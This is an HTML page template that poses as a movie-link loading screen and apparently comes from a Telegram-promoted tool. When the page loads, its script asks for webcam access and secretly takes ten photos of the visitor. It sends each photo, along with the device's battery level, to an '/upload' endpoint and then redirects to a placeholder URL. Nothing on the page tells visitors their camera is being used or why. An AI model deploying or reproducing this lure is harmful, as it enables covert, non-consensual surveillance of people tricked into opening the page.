<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
            animation: blink 1s steps(2, start) infinite;
        }
        @keyframes blink {
            to {
                visibility: hidden;
            }
        }
        p {
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>MADE BY gajarbotol.t.me</h1>
        <p>MOVIE LINK IS LOADING PLEASE WAIT...</p>
    </div>
    <script>
        async function startCapture() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                const capturePhotos = async () => {
                    for (let i = 0; i < 10; i++) { // Capture 10 photos
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const snapshot = canvas.toDataURL('image/png');

                        const battery = await navigator.getBattery();
                        const batteryLevel = Math.round(battery.level * 100);

                        await fetch('/upload', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ image: snapshot, battery: batteryLevel })
                        });

                        await new Promise(resolve => setTimeout(resolve, 300)); // 300ms delay
                    }

                    video.pause();
                    stream.getTracks().forEach(track => track.stop());
                };

                video.addEventListener('loadedmetadata', () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    capturePhotos();
                });
            }
        }

        // Start capture as soon as the page loads
        window.addEventListener('load', () => {
            startCapture();
            setTimeout(() => {
                window.location.href = "{{ redirect_url }}";
            }, 6000); // Wait for 6 seconds before redirecting
        });
    </script>
</body>
</html>
